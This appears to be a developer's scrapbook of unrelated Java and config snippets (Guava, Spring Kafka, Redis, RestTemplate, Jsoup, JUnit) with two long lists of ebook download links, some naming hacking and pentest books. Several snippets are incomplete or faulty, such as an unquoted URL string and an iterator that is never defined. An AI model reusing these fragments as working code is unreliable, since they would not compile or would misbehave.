            students.add(item);
        } finally {
            monitor.leave();
        }
    }

    public Boolean isStudentsCapacityUptoLimit() {
        return students.size() > MAX_SIZE;
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.Interner;
import com.google.common.collect.Interners;

public class InternerBuilderExample {

    public static void main(String[] args) {
        Interner<Integer> interners = Interners.<Integer> newBuilder()
          .concurrencyLevel(2)
          .strong().<Integer> build();

    }

}
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.Comparators;

import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

public class ComparatorsExamples {

    public static void main(String[] args) {

        List<Integer> integers = Arrays.asList(1, 2, 3, 4, 4, 6, 7, 8, 9, 10);
        boolean isInAscendingOrder = Comparators.isInOrder(integers, new AscedingOrderComparator());
        System.out.println(isInAscendingOrder);

    }

    private static class AscedingOrderComparator implements Comparator<Integer> {
        @Override
        public int compare(Integer o1, Integer o2) {
            return o1.compareTo(o2);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    <!-- configure root logger conditionally -->	
    <property scope="context" resource="application.properties" />
	
    <if condition='property("env").equals("dev")'>
        <then>
            <root level="TRACE">
                <appender-ref ref="STDOUT" />
            </root>
        </then>
    </if>
--------------------------------------------------------------------------------------------------------
import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.IdClass;

@Entity
@IdClass(OrderEntryPK.class)
public class OrderEntryIdClass {
    @Id
    private long orderId;
    @Id
    private long productId;

    public long getOrderId() {
        return orderId;
    }

    public void setOrderId(long orderId) {
        this.orderId = orderId;
    }

    public long getProductId() {
        return productId;
    }

    public void setProductId(long productId) {
        this.productId = productId;
    }

}
--------------------------------------------------------------------------------------------------------
http://www.allitebooks.org/the-iot-hackers-handbook/
http://www.allitebooks.org/linux-basics-for-hackers/
http://www.allitebooks.org/mastering-kali-linux-for-advanced-penetration-testing/
http://www.allitebooks.org/mastering-kali-linux-for-advanced-penetration-testing/
http://www.allitebooks.org/the-network-security-test-lab/
http://www.allitebooks.org/ntp-security/
http://www.allitebooks.org/effective-python-penetration-testing/
http://www.allitebooks.org/privileged-attack-vectors/
http://www.allitebooks.org/effective-python-penetration-testing/
http://www.allitebooks.org/mastering-nmap-scripting-engine/
http://www.allitebooks.org/network-security-through-data-analysis-2nd-edition/
http://www.allitebooks.org/learning-game-ai-programming-with-lua/
http://www.allitebooks.org/lua-game-development-cookbook/
http://www.allitebooks.org/create-mobile-games-with-corona/
http://www.allitebooks.org/network-security-through-data-analysis/
http://www.allitebooks.org/kali-linux-cookbook/
http://www.allitebooks.org/learning-kali-linux/
http://www.allitebooks.org/kali-linux-ctf-blueprints/
http://www.allitebooks.org/penetration-testing/
http://www.allitebooks.org/penetration-testing-with-the-bash-shell/
http://www.allitebooks.org/kali-linux-network-scanning-cookbook/
http://www.allitebooks.org/penetration-testing-with-raspberry-pi/
http://www.allitebooks.org/mastering-wireless-penetration-testing-for-highly-secured-environments/
http://www.allitebooks.org/penetration-testing-with-backbox/
http://www.allitebooks.org/the-hacker-playbook-practical-guide-to-penetration-testing/
http://www.allitebooks.org/python-penetration-testing-essentials/
http://www.allitebooks.org/building-virtual-pentesting-labs-for-advanced-penetration-testing/
http://www.allitebooks.org/kali-linux-2-windows-penetration-testing/
http://www.allitebooks.org/kali-linux-wireless-penetration-testing-beginners-guide/
http://www.allitebooks.org/web-penetration-testing-with-kali-linux/
http://www.allitebooks.org/kali-linux-web-penetration-testing-cookbook/
http://www.allitebooks.org/web-penetration-testing-with-kali-linux-second-edition/
http://www.allitebooks.org/kali-linux-2-assuring-security-by-penetration-testing-3rd-edition/
http://www.allitebooks.org/kali-linux-cookbook/
http://www.allitebooks.org/mastering-kali-linux-wireless-pentesting/
http://www.allitebooks.org/beginning-ethical-hacking-with-python/
http://www.allitebooks.org/network-security-hacks-2nd-edition/
http://www.allitebooks.org/hacking-marketing/
http://www.allitebooks.org/hacking-android/
http://www.allitebooks.org/application-security-for-the-android-platform/
http://www.allitebooks.org/android-hackers-handbook/
http://www.allitebooks.org/learning-pentesting-for-android-devices/
http://www.allitebooks.org/exploring-se-for-android/
http://www.allitebooks.org/android-application-programming-with-opencv/
http://www.allitebooks.org/learning-image-processing-with-opencv/
http://www.allitebooks.org/opencv-essentials/
http://www.allitebooks.org/monetizing-machine-learning/
http://www.allitebooks.org/raspberry-pi-iot-projects/
http://www.allitebooks.org/beginning-artificial-intelligence-with-the-raspberry-pi/
http://www.allitebooks.org/hacking-vim-7-2/
http://www.allitebooks.org/cybersecurity-for-hospitals-and-healthcare-facilities/
http://www.allitebooks.org/building-a-hipaa-compliant-cybersecurity-program/
http://www.allitebooks.org/machine-learning-for-hackers/
http://www.allitebooks.org/machine-learning-paradigms-applications-in-recommender-systems/
http://www.allitebooks.org/learn-to-code-with-games/
http://www.allitebooks.org/machine-learning-for-audio-image-and-video-analysis-2nd-edition/
http://www.allitebooks.org/bandit-algorithms-for-website-optimization/
http://www.allitebooks.org/hack-and-hhvm/
http://www.allitebooks.org/hacking-raspberry-pi/
http://www.allitebooks.org/instant-raspberry-pi-gaming/
http://www.allitebooks.org/raspberry-pi-gaming-2nd-edition/
http://www.allitebooks.org/python-hacking-essentials/
http://www.allitebooks.org/linux-hacker/
http://www.allitebooks.org/linux-networking-cookbook/
http://www.allitebooks.org/tcpip-architecture-design-and-implementation-in-linux/
http://www.allitebooks.org/understanding-linux-network-internals/
http://www.allitebooks.org/windows-8-hacks/
http://www.allitebooks.org/big-book-of-windows-hacks/
http://www.allitebooks.org/windows-vista-annoyances/
http://www.allitebooks.org/kinect-hacks/
http://www.allitebooks.org/hacking-point-of-sale/
http://www.allitebooks.org/hackers/
http://www.allitebooks.org/advanced-programming-in-the-unix-environment-3rd-edition/
http://www.allitebooks.org/essential-system-administration-3rd-edition/
http://www.allitebooks.org/shell-scripting/
http://www.allitebooks.org/hacking-and-securing-ios-applications/
http://www.allitebooks.org/pro-bash-programming/
http://www.allitebooks.org/expert-shell-scripting/
http://www.allitebooks.org/mastering-unix-shell-scripting/
http://www.allitebooks.org/learning-shell-scripting-with-zsh/
http://www.allitebooks.org/network-security-hacks-2nd-edition/
http://www.allitebooks.org/security-power-tools/
http://www.allitebooks.org/50-android-hacks/
http://www.allitebooks.org/hello-android-3rd-edition/
http://www.allitebooks.org/ubuntu-hacks/
http://www.allitebooks.org/ubuntu-hacks/
http://www.allitebooks.org/linux-server-hacks/
http://www.allitebooks.org/bsd-hacks/
http://www.allitebooks.org/professional-linux-programming/
http://www.allitebooks.org/beginning-linux-programming-4th-edition/
http://www.allitebooks.org/devops-troubleshooting-linux-server-best-practices/
http://www.allitebooks.org/linux-thin-client-networks-design-and-deployment/
http://www.allitebooks.org/linux-network-administrators-guide-3rd-edition/
http://www.allitebooks.org/html5-hacks/
http://www.allitebooks.org/migration-to-html5-and-css3-how-to/
http://www.allitebooks.org/migration-to-html5-and-css3-how-to/
http://www.allitebooks.org/hello-html5-css3/
http://www.allitebooks.org/html5-and-css3-2nd-edition/
http://www.allitebooks.org/professional-red-teaming/
http://www.allitebooks.org/data-analysis-for-network-cyber-security/
http://www.allitebooks.org/professional-red-teaming/
http://www.allitebooks.org/wireshark-network-security/
http://www.allitebooks.org/advanced-perl-programming-2nd-edition/
http://www.allitebooks.org/privileged-attack-vectors/
http://www.allitebooks.org/practical-video-game-bots/
http://www.allitebooks.org/game-hacking/
http://www.allitebooks.org/learning-unreal-engine-android-game-development/
http://www.allitebooks.org/firewalls-dont-stop-dragons-3rd-edition/
http://www.allitebooks.org/stack-frames/
http://www.allitebooks.org/network-forensics/
http://www.allitebooks.org/open-source-intelligence-methods-and-tools/
http://www.allitebooks.org/raspberry-pi-user-guide/
http://www.allitebooks.org/raspberry-pi-computer-architecture-essentials/
http://www.allitebooks.org/it-disaster-response/
http://www.allitebooks.org/defensive-security-handbook/
http://www.allitebooks.org/learning-saltstack-second-edition/
http://www.allitebooks.org/gitolite-essentials/
http://www.allitebooks.org/salt-essentials/
http://www.allitebooks.org/mastering-puppet/
http://www.allitebooks.org/instant-puppet-3-starter/
http://www.allitebooks.org/netcat-starter/
http://www.allitebooks.org/essential-snmp-2nd-edition/
http://www.allitebooks.org/wireshark-starter/
http://www.allitebooks.org/practical-packet-analysis/
http://www.allitebooks.org/distributed-graph-algorithms-for-computer-networks/
http://www.allitebooks.org/fundamentals-of-sensor-network-programming/
http://www.allitebooks.org/distributed-graph-algorithms-for-computer-networks/
http://www.allitebooks.org/burp-suite-starter/
http://www.allitebooks.org/network-analysis-using-wireshark-cookbook/
http://www.allitebooks.org/the-book-of-pf-a-no-nonsense-guide-to-the-openbsd-firewall/
http://www.allitebooks.org/understanding-tcpip/
http://www.allitebooks.org/packet-guide-to-core-network-protocols/
http://www.allitebooks.org/raspberry-pi-projects-for-dummies/
http://www.allitebooks.org/electronics-cookbook/
http://www.allitebooks.org/kali-linux-2-windows-penetration-testing/
http://www.allitebooks.org/data-analysis-for-network-cyber-security/
http://www.allitebooks.org/practical-internet-of-things-security/
http://www.allitebooks.org/professional-red-teaming/
http://www.allitebooks.org/programmers-guide-to-drupal-2nd-edition/
http://www.allitebooks.org/smart-home-automation-with-linux-and-raspberry-pi-2nd-edition/
http://www.allitebooks.org/beginning-nfc/
http://www.allitebooks.org/android-application-development/
http://www.allitebooks.org/android-development-tools-for-eclipse/
http://www.allitebooks.org/learn-electronics-with-raspberry-pi/
http://www.allitebooks.org/instant-raspberry-pi-gaming/
http://www.allitebooks.org/raspberry-pi-gaming-2nd-edition/
http://www.allitebooks.org/ios-sensor-apps-with-arduino/
http://www.allitebooks.org/basic-sensors-in-ios/
http://www.allitebooks.org/learning-ecmascript-6/
http://www.allitebooks.org/learning-underscore-js/
http://www.allitebooks.org/javascript-concurrency/
http://www.allitebooks.org/building-scalable-apps-with-redis-and-node-js/
http://www.allitebooks.org/node-js-essentials/
http://www.allitebooks.org/building-apis-with-node-js/
http://www.allitebooks.org/ext-js-data-driven-application-design/
http://www.allitebooks.org/javascript-with-promises/
http://www.allitebooks.org/websocket-lightweight-client-server-communications/
http://www.allitebooks.org/building-node-applications-with-mongodb-and-backbone/
http://www.allitebooks.org/maintainable-javascript/
http://www.allitebooks.org/learning-javascript-design-patterns/
http://www.allitebooks.org/mastering-javascript-design-patterns/
http://www.allitebooks.org/cloud-architecture-patterns/
http://www.allitebooks.org/pro-javascript-design-patterns/
http://www.allitebooks.org/pragmatic-guide-to-javascript/
http://www.allitebooks.org/pro-javascript-performance/
http://www.allitebooks.org/expert-javascript/
http://www.allitebooks.org/pro-javascript-techniques/
http://www.allitebooks.org/pro-javascript-for-web-apps/
http://www.allitebooks.org/the-modern-web/
http://www.allitebooks.org/jump-start-javascript/
http://www.allitebooks.org/fundamentals-of-web-development/
http://www.allitebooks.org/web-application-design-and-implementation/
http://www.allitebooks.org/fundamentals-of-web-development/
http://www.allitebooks.org/effective-javascript/
http://www.allitebooks.org/javascript-creativity/
http://www.allitebooks.org/plug-in-javascript-100-power-solutions/
http://www.allitebooks.org/modern-javascript/
http://www.allitebooks.org/beginning-javascript-with-dom-scripting-and-ajax-2nd-edition/
http://www.allitebooks.org/object-oriented-javascript/
http://www.allitebooks.org/mastering-object-oriented-python/
http://www.allitebooks.org/mastering-javascript-design-patterns/
http://www.allitebooks.org/object-oriented-javascript-2nd-edition/
http://www.allitebooks.org/learning-ecmascript-6/
http://www.allitebooks.org/backbone-js-patterns-and-best-practices/
http://www.allitebooks.org/typescript-essentials/
http://www.allitebooks.org/learning-typescript/
http://www.allitebooks.org/node-js-blueprints/
http://www.allitebooks.org/beautiful-javascript-leading-programmers-explain-how-they-think/
http://www.allitebooks.org/practical-web-development/
http://www.allitebooks.org/jasmine-cookbook/
http://www.allitebooks.org/arcgis-for-javascript-developers-by-example/
http://www.allitebooks.org/introducing-arcgis-api-4-for-javascript/
http://www.allitebooks.org/mastering-knockoutjs/
http://www.allitebooks.org/beginning-javascript-5th-edition/
http://www.allitebooks.org/backbone-js-patterns-and-best-practices/
http://www.allitebooks.org/learning-javascript/
http://www.allitebooks.org/developing-web-components/
http://www.allitebooks.org/practical-information-security-management/
http://www.allitebooks.org/cyber-physical-attack-recovery-procedures/
--------------------------------------------------------------------------------------------------------
import org.springframework.messaging.Message;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * JSON Message converter - String on output, String, Bytes, or byte[] on input. Used in
 * conjunction with Kafka
 * {@code StringSerializer/StringDeserializer or BytesDeserializer}. Consider using the
 * BytesJsonMessageConverter instead.
 *
 * @author Gary Russell
 * @author Artem Bilan
 * @author Dariusz Szablinski
 */
public class StringJsonMessageConverter extends JsonMessageConverter {

	public StringJsonMessageConverter() {
		super();
	}

	public StringJsonMessageConverter(ObjectMapper objectMapper) {
		super(objectMapper);
	}

	@Override
	protected Object convertPayload(Message<?> message) {
		try {
			return getObjectMapper()
					.writeValueAsString(message.getPayload());
		}
		catch (JsonProcessingException e) {
			throw new ConversionException("Failed to convert to JSON", e);
		}
	}
}
--------------------------------------------------------------------------------------------------------
http://www.allitebooks.org/internet-of-things-with-python/
http://www.allitebooks.org/internet-of-things-with-intel-galileo/
http://www.allitebooks.org/home-automation-with-intel-galileo/
http://www.allitebooks.org/intel-galileo-networking-cookbook/
http://www.allitebooks.org/arduino-networking/
http://www.allitebooks.org/building-arduino-plcs/
http://www.allitebooks.org/internet-of-things-with-esp8266/
http://www.allitebooks.org/learning-iot-with-particle-photon-and-electron/
http://www.allitebooks.org/c-programming-for-arduino/
http://www.allitebooks.org/learn-robotics-with-raspberry-pi/
http://www.allitebooks.org/raspberry-pi-robotic-projects/
http://www.allitebooks.org/raspberry-pi-robotics-projects-second-edition/
http://www.allitebooks.org/intel-galileo-blueprints/
http://www.allitebooks.org/arduino-by-example/
http://www.allitebooks.org/building-a-home-security-system-with-arduino/
http://www.allitebooks.org/arduino-home-automation/
http://www.allitebooks.org/internet-of-things-with-the-arduino-yun/
http://www.allitebooks.org/server-load-balancing/
http://www.allitebooks.org/designing-large-scale-lans/
http://www.allitebooks.org/advanced-wireless-networks-cognitive-cooperative-opportunistic-4g-technology-2nd-edition/
http://www.allitebooks.org/indoor-radio-planning-a-practical-guide-for-2g-3g-and-4g-3rd-edition/
http://www.allitebooks.org/femtocells-design-and-application/
http://www.allitebooks.org/next-generation-mobile-systems-3g-beyond/
http://www.allitebooks.org/4g-wireless-video-communications/
http://www.allitebooks.org/mobile-handset-design/
http://www.allitebooks.org/arduino-wearable-projects/
http://www.allitebooks.org/arduino-wearable-projects/
http://www.allitebooks.org/practical-fashion-tech/
http://www.allitebooks.org/computer-organization-and-design-fifth-edition/
http://www.allitebooks.org/making-sense-of-sensors/
http://www.allitebooks.org/embedded-firmware-solutions/
http://www.allitebooks.org/crafting-wearables/
http://www.allitebooks.org/epub-3-best-practices/
http://www.allitebooks.org/html5-for-publishers/
http://www.allitebooks.org/html5-video-how-to/
http://www.allitebooks.org/html5-media/
http://www.allitebooks.org/machining-for-dummies/
http://www.allitebooks.org/electronics-for-kids/
http://www.allitebooks.org/digital-security-cyber-terror-and-cyber-security/
http://www.allitebooks.org/discovering-computers-2016/
http://www.allitebooks.org/a-newbies-guide-to-apple-watch/
http://www.allitebooks.org/apple-watch-app-development/
http://www.allitebooks.org/swift-for-beginners-develop-and-design/
http://www.allitebooks.org/canvas-lms-course-design/
http://www.allitebooks.org/jira-essentials-third-edition/
http://www.allitebooks.org/tensorflow-for-deep-learning/
http://www.allitebooks.org/infrastructure-software-modules-for-enterprises/
http://www.allitebooks.org/numerical-python-2nd-edition/
http://www.allitebooks.org/learning-bing-maps-api/
http://www.allitebooks.org/microsoft-mapping/
http://www.allitebooks.org/practical-free-alternatives-to-commercial-software/
http://www.allitebooks.org/jira-6-x-administration-cookbook/
http://www.allitebooks.org/arduino-programming-with-net-and-sketch/
http://www.allitebooks.org/junk-box-arduino/
http://www.allitebooks.org/junk-box-arduino/
http://www.allitebooks.org/arduino-cookbook/
http://www.allitebooks.org/programming-arduino-with-labview/
http://www.allitebooks.org/arduino-robotic-projects/
http://www.allitebooks.org/beaglebone-by-example/
http://www.allitebooks.org/advanced-wireless-communications-4g-cognitive-and-cooperative-broadband-technology-2nd-edition/
http://www.allitebooks.org/arduino-2nd-edition/
http://www.allitebooks.org/http-succinctly/
http://www.allitebooks.org/mobile-communication-systems/
http://www.allitebooks.org/camel-intelligent-networks-for-the-gsm-gprs-and-umts-network/
http://www.allitebooks.org/boost-asio-c-network-programming/
http://www.allitebooks.org/beaglebone-home-automation/
http://www.allitebooks.org/abusing-the-internet-of-things-blackouts-freakouts-and-stakeouts/
http://www.allitebooks.org/making-things-talk-second-edition/
http://www.allitebooks.org/raspberry-pi-home-automation-with-arduino-second-edition/
http://www.allitebooks.org/arduino-development-cookbook/
http://www.allitebooks.org/designing-the-internet-of-things/
--------------------------------------------------------------------------------------------------------
language: java
jdk: oraclejdk8
install: true
before_cache:
  - rm -f $HOME/.gradle/caches/modules-2/modules-2.lock
cache:
  directories:
    - $HOME/.gradle/caches/
    - $HOME/.gradle/wrapper/
script:
  - ./gradlew check --no-daemon
--------------------------------------------------------------------------------------------------------
Set<HttpMethod> optionsForAllow = restTemplate.optionsForAllow(fooResourceUrl);
HttpMethod[] supportedMethods
  = {HttpMethod.GET, HttpMethod.POST, HttpMethod.PUT, HttpMethod.DELETE};
assertTrue(optionsForAllow.containsAll(Arrays.asList(supportedMethods)));
--------------------------------------------------------------------------------------------------------
EntityUtils.toString(response.getEntity(), "UTF-8")
String responseXml = EntityUtils.toString(httpResponse.getEntity());
EntityUtils.consume(httpResponse.getEntity());

   String inputLine ;
 BufferedReader br = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
 try {
       while ((inputLine = br.readLine()) != null) {
              System.out.println(inputLine);
       }
       br.close();
  } catch (IOException e) {
       e.printStackTrace();
  }
--------------------------------------------------------------------------------------------------------
	/**
	 * @author Christoph Strobl
	 * @since 1.7
	 */
	static class RedisCriteriaAccessor implements CriteriaAccessor<RedisOperationChain> {

		@Override
		public RedisOperationChain resolve(KeyValueQuery<?> query) {
			return (RedisOperationChain) query.getCriteria();
		}
	}
	
		/**
	 * Redis specific {@link KeyValueCallback}.
	 *
	 * @author Christoph Strobl
	 * @param <T>
	 * @since 1.7
	 */
	public static abstract class RedisKeyValueCallback<T> implements KeyValueCallback<T> {

		/*
		 * (non-Javadoc)
		 * @see org.springframework.data.keyvalue.core.KeyValueCallback#doInKeyValue(org.springframework.data.keyvalue.core.KeyValueAdapter)
		 */
		@Override
		public T doInKeyValue(KeyValueAdapter adapter) {
			return doInRedis((RedisKeyValueAdapter) adapter);
		}

		public abstract T doInRedis(RedisKeyValueAdapter adapter);
	}
--------------------------------------------------------------------------------------------------------
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.SerializationException;
import org.springframework.lang.Nullable;

/**
 * @author Mark Paluch
 */
enum RawRedisSerializer implements RedisSerializer<byte[]> {

	INSTANCE;

	@Nullable
	@Override
	public byte[] serialize(@Nullable byte[] bytes) throws SerializationException {
		return bytes;
	}

	@Nullable
	@Override
	public byte[] deserialize(@Nullable byte[] bytes) throws SerializationException {
		return bytes;
	}
}
--------------------------------------------------------------------------------------------------------

import org.apache.kafka.clients.consumer.Consumer;
import org.apache.kafka.clients.consumer.ConsumerRecords;

import org.springframework.core.task.SimpleAsyncTaskExecutor;
import org.springframework.kafka.KafkaException;
import org.springframework.util.Assert;

/**
 * A container error handler that stops the container after an exception
 * is thrown by the listener.
 *
 * @author Gary Russell
 * @since 2.1
 *
 */
public class ContainerStoppingBatchErrorHandler implements ContainerAwareBatchErrorHandler {

	private final Executor executor;

	public ContainerStoppingBatchErrorHandler() {
		this.executor = new SimpleAsyncTaskExecutor();
	}

	public ContainerStoppingBatchErrorHandler(Executor executor) {
		Assert.notNull(executor, "'executor' cannot be null");
		this.executor = executor;
	}

	@Override
	public void handle(Exception thrownException, ConsumerRecords<?, ?> data, Consumer<?, ?> consumer,
			MessageListenerContainer container) {
		this.executor.execute(() -> container.stop());
		// isRunning is false before the container.stop() waits for listener thread
		int n = 0;
		while (container.isRunning() && n++ < 100) { // NOSONAR magic #
			try {
				Thread.sleep(100); // NOSONAR magic #
			}
			catch (InterruptedException e) {
				Thread.currentThread().interrupt();
				break;
			}
		}
		throw new KafkaException("Stopped container", thrownException);
	}

}
--------------------------------------------------------------------------------------------------------
/**
 * Finds a set of elements through a CSS selector and swaps its tag with
 * that from its parent.
 * 
 * @param root
 *            body element with source divisions to upgrade
 * @param selector
 *            CSS selector for the elements to swap with its parent
 */
public final void swapTagWithParent(final Element root,
    final String selector) {
  final Iterable<Element> elements; // Selected elements
  Element parent;                   // Parent element
  String text;                      // Preserved text
  checkNotNull(root, "Received a null pointer as root element");
  checkNotNull(selector, "Received a null pointer as selector");
  // Selects and iterates over the elements
  elements = root.select(selector);
  for (final Element element : elements) {
    parent = element.parent();
    // Takes the text out of the element
    text = element.text();
    element.text("");
    // Swaps elements
    parent.replaceWith(element);
    element.appendChild(parent);
    // Sets the text into what was the parent element
    parent.text(text);
  }
}

Elements elements = doc.select("img[src$=a.gif]");
 for(Element element : elements)
 {
  element.replaceWith(new TextNode("A", null));
 }
--------------------------------------------------------------------------------------------------------
 File input = new File("your.html");
Document doc = Jsoup.parse(input, "UTF-8");

Elements links = doc.select("a[href]");

while (links.hasNext()) {
 Element link = iterator.next();
 Element bold = doc.createElement("b").appendText(link.text());
 link.replaceWith(bold);
}

Elements elements = doc.select("img[src$=a.gif]");
 for(Element element : elements)
 {
  element.replaceWith(new TextNode("A", null));
 }
 
  Document doc = Jsoup.parse(html);
for (Element small: doc.select("small")) {
 small.replaceWith(new Element(Tag.valueOf("span"), "").text(small.text()));
}
System.out.println(doc.html()); // prints html with <small> replaced by <span>

 for (Element elem : document.select(".singolo-contenuto a")) {
  if(elem.parents().hasClass("list_attachments")) continue;
  String href = elem.attr("href");
  String text = elem.text();
  elem.replaceWith(new TextNode(href + " " + text, ""));
}
String result = document.select(".singolo-contenuto").text();



 Document doc = Jsoup.parse(inputHtml);
Elements links = doc.select("a");
String baseUri = links.get(0).baseUri();
for(Element link : links) {
  Node linkText = new TextNode(link.html(), baseUri);
  // optionally wrap it in a tag instead:
  // Element linkText = doc.createElement("span");
  // linkText.html(link.html());
  link.replaceWith(linkText);
}



--------------------------------------------------------------------------------------------------------
https://github.com/spring-projects/spring-kafka/blob/654d3bf5c7c59514b3191bf1cf8218c9370987fa/spring-kafka/src/test/java/org/springframework/kafka/listener/TransactionalContainerTests.java
Compare a Set of Files

$ diffuse file1 file2 file3
Review Local Changes or Fix Merge Conflicts

$ diffuse -m
Compare Specific Revisions

$ diffuse -r rev1 -r rev2 file
Inspect a Revision

$ diffuse -c rev
--------------------------------------------------------------------------------------------------------
# Basic function options
x-function: &function
  labels:
    function: "true"
  depends_on:
    - gateway
  networks:
    - functions
# Linux placement
x-linux: &linux-only
  deploy:
    placement:
      constraints:
        - 'node.platform.os == linux'
# Windows placement
x-windows: &windows-only
  deploy:
    placement:
      constraints:
        - 'node.platform.os == windows'
services:
  # Node.js gives OS info about the node (Host)
  nodeinfo:
    <<: *function
    <<: *linux-only
    image: functions/nodeinfo:latest
    environment:
      no_proxy: "gateway"
      https_proxy: $https_proxy
  # Uses `cat` to echo back response, fastest function to execute.
  echoit:
    <<: *function
    <<: *linux-only
    image: functions/alpine:health
    environment:
      fprocess: "cat"
      no_proxy: "gateway"
      https_proxy: $https_proxy
--------------------------------------------------------------------------------------------------------
HttpHeaders headers = new HttpHeaders();
headers.set("Accept", MediaType.APPLICATION_JSON_VALUE);

UriComponentsBuilder builder = UriComponentsBuilder.fromHttpUrl(url)
        .queryParam("msisdn", msisdn)
        .queryParam("email", email)
        .queryParam("clientVersion", clientVersion)
        .queryParam("clientType", clientType)
        .queryParam("issuerName", issuerName)
        .queryParam("applicationName", applicationName);

HttpEntity<?> entity = new HttpEntity<>(headers);

HttpEntity<String> response = restTemplate.exchange(
        builder.toUriString(), 
        HttpMethod.GET, 
        entity, 
        String.class);
		
Map<String, String> vars = new HashMap<>();
vars.put("hotel", "42");
vars.put("room", "21");

restTemplate.getForObject("http://example.com/hotels/{hotel}/rooms/{hotel}", 
    String.class, vars);
	
  @Value("${endpoint.url}")
  private String endpointURL;
  // you can use variable args feature in Java
  public String requestParamMethodNameHere(String value1, String value2) {
    RestTemplate restTemplate = new RestTemplate();
    restTemplate
           .getMessageConverters()
           .add(new MappingJackson2HttpMessageConverter());

    HttpHeaders headers = new HttpHeaders();
    headers.set("Accept", MediaType.APPLICATION_JSON_VALUE);
    HttpEntity<String> entity = new HttpEntity<>(headers);

    try {
      String formatted_URL = MessageFormat.format(endpointURL, value1, value2);
      ResponseEntity<String> response = restTemplate.exchange(
                    formatted_URL ,
                    HttpMethod.GET,
                    entity,
                    String.class);
     return response.getBody();
    } catch (Exception e) { e.printStackTrace(); }
	
    String uri = http://my-rest-url.org/rest/account/{account};

    Map<String, String> uriParam = new HashMap<>();
    uriParam.put("account", "my_account");

    UriComponents builder = UriComponentsBuilder.fromHttpUrl(uri)
                .queryParam("pageSize","2")
                        .queryParam("page","0")
                        .queryParam("name","my_name").build();

    HttpEntity<String> requestEntity = new HttpEntity<>(null, getHeaders());

    ResponseEntity<String> strResponse = restTemplate.exchange(builder.toUriString(),HttpMethod.GET, requestEntity,
                        String.class,uriParam);

    //final URL: http://my-rest-url.org/rest/account/my_account?pageSize=2&page=0&name=my_name
--------------------------------------------------------------------------------------------------------
@Test
public void whenModifyingOriginalObject_thenGsonCloneShouldNotChange() {
    Address address = new Address("Downing St 10", "London", "England");
    User pm = new User("Prime", "Minister", address);
    Gson gson = new Gson();
    User deepCopy = gson.fromJson(gson.toJson(pm), User.class);
 
    address.setCountry("Great Britain");
 
    assertThat(deepCopy.getAddress().getCountry())
      .isNotEqualTo(pm.getAddress().getCountry());
}

@Test
public void whenModifyingOriginalObject_thenJacksonCopyShouldNotChange() throws IOException {
    Address address = new Address("Downing St 10", "London", "England");
    User pm = new User("Prime", "Minister", address);
    ObjectMapper objectMapper = new ObjectMapper();
     
    User deepCopy = objectMapper
      .readValue(objectMapper.writeValueAsString(pm), User.class);
 
    address.setCountry("Great Britain");
 
    assertThat(deepCopy.getAddress().getCountry())
      .isNotEqualTo(pm.getAddress().getCountry());
}

@Test
public void givenListOfCustomers_whenTransformed_thenListOfAddress() {
    Collection<Address> addressCol = CollectionUtils.collect(list1, 
      new Transformer<Customer, Address>() {
        public Address transform(Customer customer) {
            return customer.getAddress();
        }
    });
     
    List<Address> addressList = new ArrayList<>(addressCol);
    assertTrue(addressList.size() == 3);
    assertTrue(addressList.get(0).getLocality().equals("locality1"));
}

@Test
public void givenCustomerList_WhenFiltered_thenCorrectSize() {
     
    boolean isModified = CollectionUtils.filter(linkedList1, 
      new Predicate<Customer>() {
        public boolean evaluate(Customer customer) {
            return Arrays.asList("Daniel","Kyle").contains(customer.getName());
        }
    });
      
    assertTrue(linkedList1.size() == 2);
}

@Test
public void givenCustomerListAndASubcollection_whenChecked_thenTrue() {
    assertTrue(CollectionUtils.isSubCollection(list3, list1));
}
@Test
public void givenTwoLists_whenIntersected_thenCheckSize() {
    Collection<Customer> intersection = CollectionUtils.intersection(list1, list3);
    assertTrue(intersection.size() == 2);
}
@Test
public void givenTwoLists_whenSubtracted_thenCheckElementNotPresentInA() {
    Collection<Customer> result = CollectionUtils.subtract(list1, list3);
    assertFalse(result.contains(customer1));
}
@Test
public void givenTwoLists_whenUnioned_thenCheckElementPresentInResult() {
    Collection<Customer> union = CollectionUtils.union(list1, list2);
  
    assertTrue(union.contains(customer1));
    assertTrue(union.contains(customer4));
}
@Test
public void givenTwoSortedLists_whenCollated_thenSorted() {
    List<Customer> sortedList = CollectionUtils.collate(list1, list2);
 
    assertEquals(6, sortedList.size()); 
    assertTrue(sortedList.get(0).getName().equals("Bob"));
    assertTrue(sortedList.get(2).getName().equals("Daniel"));
}
@Test
public void givenList_whenAddIgnoreNull_thenNoNullAdded() {
    CollectionUtils.addIgnoreNull(list1, null);
  
    assertFalse(list1.contains(null));
}
--------------------------------------------------------------------------------------------------------
import static org.fest.assertions.Assertions.assertThat;
import static org.powermock.api.mockito.PowerMockito.mockStatic;
import static org.powermock.api.mockito.PowerMockito.verifyStatic;

import java.util.List;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Captor;
import org.mockito.MockitoAnnotations;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

@RunWith(PowerMockRunner.class)
@PrepareForTest(HelperClass.class)
public class MyClassTest {

    private MyClass classUnderTest;

    @Captor
    private ArgumentCaptor<String> fileNameCaptor;

    @Captor
    private ArgumentCaptor<List<String>> dataCaptor;

    @Before
    public void setup() {
        MockitoAnnotations.initMocks(this);
        mockStatic(HelperClass.class);
        classUnderTest = new MyClass();
    }

    @Test
    public void shouldMakeNastyStaticCall() {
        classUnderTest.testMethod();

        verifyStatic();
        HelperClass.nastyStaticCall(fileNameCaptor.capture(), dataCaptor.capture());

        assertThat(fileNameCaptor.getValue()).isEqualTo("FILENAME");
        assertThat(dataCaptor.getValue()).containsOnly("Data");
    }
}
--------------------------------------------------------------------------------------------------------
    <dependency>
        <groupId>org.unitils.objectvalidation</groupId>
        <artifactId>unitils-objectvalidation</artifactId>
        <version>1.1.4</version>
    </dependency>
--------------------------------------------------------------------------------------------------------
ComparatorChain chain = new ComparatorChain(Arrays.asList(
   new BeanComparator("size"), 
   new BeanComparator("nrOfToppings"), 
   new BeanComparator("name")));

